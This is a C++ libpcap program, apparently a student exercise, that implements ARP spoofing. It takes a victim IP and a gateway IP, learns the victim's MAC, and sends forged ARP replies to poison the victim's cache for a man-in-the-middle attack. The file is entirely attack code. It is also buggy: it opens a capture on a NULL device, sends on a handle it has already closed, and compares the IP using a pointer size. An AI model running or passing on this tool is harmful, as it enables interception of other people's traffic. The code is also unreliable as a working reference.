#include <linux/if.h>
#include <cstring>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <regex>
#include <arpa/inet.h>
#include <fstream>
#include <streambuf>
#include <iostream>

#define MAC_ADDR_LEN 6
#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

class Ip_class {
	unsigned char protocol = 0x06;
	unsigned char headerlen = 0;
	unsigned short len = 0;	
	unsigned char srcip[4] = { 0, };
	unsigned char dstip[4] = { 0, };
public:
	Ip_class() {}
	Ip_class(const char* hex)
		:protocol{ 0x06 }, len{}, srcip{}, dstip{}
	{
		memcpy(&headerlen, hex, sizeof(headerlen));
		headerlen &= 0x0f;
		headerlen *= 4;
		memcpy(&len, hex+2, sizeof(len));
		memcpy(&protocol, hex + 9, sizeof(protocol)); 
		memcpy(srcip, hex + 2 + 0xA, sizeof(srcip));
		memcpy(dstip, hex + 2 + 0xA + 4, sizeof(dstip));
		len = ntohs(len);
	}
	unsigned short length() { return len; }
	unsigned char headerLength(void) { return headerlen; }

	const char *get_src() { return (const char*)srcip; }
	const char *get_dst() { return (const char*)dstip; }
	void printSrc(void) { printf("IP Src Addr\t: %d.%d.%d.%d\n", srcip[0], srcip[1], srcip[2], srcip[3]); }
	void printDst(void) { printf("IP Dst Addr\t: %d.%d.%d.%d\n", dstip[0], dstip[1], dstip[2], dstip[3]); }
	void printLen(void) { printf("IP len\t\t: %d\n", len); }
	void printheaderLen(void) {	printf("IP headerlen\t: %u\n", headerlen);}
	void printProtocol(void) { 
		printf("Transport\t: %02x ", protocol);
		switch (protocol) {
		case 0x01:
			printf("ICMP");
			break;
		case 0x06:
			printf("TCP");
			break;
		case 0x11:
			printf("UDP");
			break;
		}
		printf("\n");
	}
	void printall(void) {
		printSrc();
		printDst();
		printLen();
		printheaderLen();
		printProtocol();
	}
};

class Ethernet_class {
	unsigned short iptype = 0x6;
	unsigned char srcmac[6] = { 0, };
	unsigned char dstmac[6] = { 0, };
public:
	Ethernet_class() {}
	Ethernet_class(const char *hex)
		: iptype{ 0x6 }, srcmac{}, dstmac{}
	{
		memcpy(srcmac, hex, sizeof(srcmac));
		memcpy(dstmac, hex + 6, sizeof(dstmac));
		memcpy(&iptype, hex + 12, sizeof(iptype));
		//memcpy((char*)srcmac, hex,sizeof(srcmac));
		//memcpy((char*)dstmac, hex+6,sizeof(dstmac));
		//memcpy((char*)(&iptype), hex + 12, sizeof(iptype));
	}
	const char *get_src() { return (const char *)srcmac; }
	const char *get_dst() { return (const char *)dstmac; }
	void printSrc() { printf("Src MAC addr\t: %02x:%02x:%02x:%02x:%02x:%02x\n", srcmac[0], srcmac[1], srcmac[2], srcmac[3], srcmac[4], srcmac[5]); }
	void printDst() { printf("Dst MAC addr\t: %02x:%02x:%02x:%02x:%02x:%02x\n", dstmac[0], dstmac[1], dstmac[2], dstmac[3], dstmac[4], dstmac[5]); }
	void printiptype(void) {
		unsigned short h = ntohs(iptype);
		
		printf("IPtype\t\t: 0x%04x ",h);
		switch (h) {
		case 0x0800:
			printf("IPv4");
			break;
		case 0x86DD:
			printf("IPv6");
			break;
		case 0x0806:
			printf("ARP");
			break;
		}
		printf("\n");
	}
	void printall(void) {
		printSrc();
		printDst();
		printiptype();
	}
};

bool get_mac_address(const std::string& if_name, uint8_t *mac_addr_buf) {
    std::string mac_addr;
    std::ifstream iface("/sys/class/net/" + if_name + "/address");
    std::string str((std::istreambuf_iterator<char>(iface)), std::istreambuf_iterator<char>());
    if (str.length() > 0) {
        std::string hex = regex_replace(str, std::regex(":"), "");
        uint64_t result = stoull(hex, 0, 16);
        for (int i = 0; i < MAC_ADDR_LEN; i++) {
            mac_addr_buf[MAC_ADDR_LEN-i-1] = (uint8_t) ((result & ((uint64_t) 0xFF << (i * 8))) >> (i * 8));
        }

        return true;
    }

    return false;
}
void get_ip_addr(char * ether, char ip_addr_buf[INET_ADDRSTRLEN]){
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    struct ifreq ifr{};
    strcpy(ifr.ifr_name, ether);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    
    strcpy(ip_addr_buf, inet_ntoa(((sockaddr_in *) &ifr.ifr_addr)->sin_addr));

    std::cout << ip_addr_buf << std::endl;
}

typedef struct {
	char* dev_;
} Param;

Param param = {
	.dev_ = NULL
};

int main(int argc, char* argv[]) {


	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

// ----------------------my code ----------------------
	uint8_t my_mac[6]= {0,}; 
	get_mac_address(argv[1],my_mac);
	
	printf("mac %s\n",my_mac);
	
	char my_ip[INET_ADDRSTRLEN];
    get_ip_addr(argv[1], my_ip);
	

	char * vic_ip = argv[2];

	char * gate_ip = argv[3];
// ----------------------my code ----------------------

	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
//first
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); 
	packet.eth_.smac_ = Mac(my_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac); // vic_mac
	packet.arp_.sip_ = htonl(Ip(my_ip)); // vic_ip
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // my_mac
	packet.arp_.tip_ = htonl(Ip(argv[2])); // gateway_ip
	
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}else{
		printf("packet send\n");
	}
	pcap_close(handle);


//second

	while (true) {
		struct pcap_pkthdr* header; // ts, caplen, len
		
		uint8_t* first;
		int res = pcap_next_ex(pcap, &header, (const u_char**)(&first)); // open  (pcap_t *pcap, pcap_pkthdr **abstact info, packet const char **)
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_e./x return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		//printf("%u bytes captured\n", header->caplen);
		printf("\nprint first %s\n", (char*)first);
		for (int i = 0; i < 42; i++){
			if (i%8 == 0) printf("\n");
			printf("%02x ",*(first + i));
		}
		uint8_t cap_mac[6] = { 0,};
		uint8_t cap_ip[4] = { 0,};
		memcpy(cap_mac, first + 0x16, 6);
		memcpy(cap_ip , first + 0x16 + 6, 4);
		const char cap_ip_cp[15] = {0,};

		sprintf((char*)cap_ip_cp,"%u.%u.%u.%u", cap_ip[0], cap_ip[1], cap_ip[2], cap_ip[3] );
		if (strncmp(cap_ip_cp, vic_ip, sizeof(vic_ip))) {
			printf("other packet\n"); 
			printf("target mac\t: %02x:%02x:%02x:%02x:%02x:%02x\n", cap_mac[0], cap_mac[1], cap_mac[2], cap_mac[3], cap_mac[4], cap_mac[5]);
			printf("target ip\t: %u.%u.%u.%u\n",cap_ip[0], cap_ip[1], cap_ip[2], cap_ip[3]);
			printf("cap_ip\t\t: %s\n", cap_ip_cp); // seder ip
			printf("gateway_ip\t: %s\n\n", argv[3]); //target ip
		}
		else { // succesful
			packet.arp_.op_ = htons(ArpHdr::Reply);
			packet.arp_.smac_ = Mac(cap_mac); // vic_mac
			packet.arp_.sip_ = htonl(Ip(argv[2])); // vic_ip
			packet.arp_.tmac_ = Mac(my_mac); // my_mac
			packet.arp_.tip_ = htonl(Ip(argv[3])); // gateway_ip

			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				printf("target mac\t: %02x:%02x:%02x:%02x:%02x:%02x\n", cap_mac[0], cap_mac[1], cap_mac[2], cap_mac[3], cap_mac[4], cap_mac[5]);
				printf("target ip\t: %u.%u.%u.%u\n",cap_ip[0], cap_ip[1], cap_ip[2], cap_ip[3]);
				printf("vic_ip\t\t: %s\n", argv[2]);
				printf("gateway_ip\t: %s\n\n", argv[3]);
			}
			break;// succesful
		}
	}
}
